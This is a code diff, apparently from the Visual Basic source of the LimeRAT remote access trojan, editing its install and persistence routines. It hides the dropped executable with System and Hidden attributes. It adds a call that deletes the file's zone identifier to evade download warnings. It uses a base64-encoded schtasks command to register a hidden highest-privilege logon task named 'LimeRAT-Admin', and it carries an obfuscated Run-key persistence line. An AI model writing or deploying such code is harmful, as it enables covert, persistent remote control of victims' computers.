@@ -16,7 +16,8 @@
                             C_Settings.MTX.Close()
                             C_Settings.MTX = Nothing
                         End If
-                        C_CriticalProcesses.CriticalProcesses_Disable()
+
+                        C_CriticalProcess.CriticalProcesses_Disable()
                         Diagnostics.Process.Start(C_Settings.fullpath)
                         End
                     Catch : End Try
@@ -45,13 +46,14 @@
                 NewFile.Flush()
                 NewFile.Close()
                 IO.File.SetAttributes(C_Settings.fullpath, IO.FileAttributes.System + IO.FileAttributes.Hidden)
+                DeleteZoneIdentifier(C_Settings.fullpath)
             Catch : End Try
         End Sub
 
         Private Shared Sub AddReg(ByVal Privileges As Boolean)
             Try
                 If Privileges = True Then
-                    'Microsoft.Win32.Registry.LocalMachine.CreateSubKey(BS(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA=="))).SetValue(C_Settings.EXE, C_Settings.fullpath)
+                    'Microsoft.Win32.Registry.LocalMachine.CreateSubKey
                     '"schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr "
                     Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgT05MT0dPTiAvUkwgSElHSEVTVCAvdG4gTGltZVJBVC1BZG1pbiAvdHIg")) + """'" & C_Settings.fullpath & "'""", AppWinStyle.Hide, False, -1)
                 Else
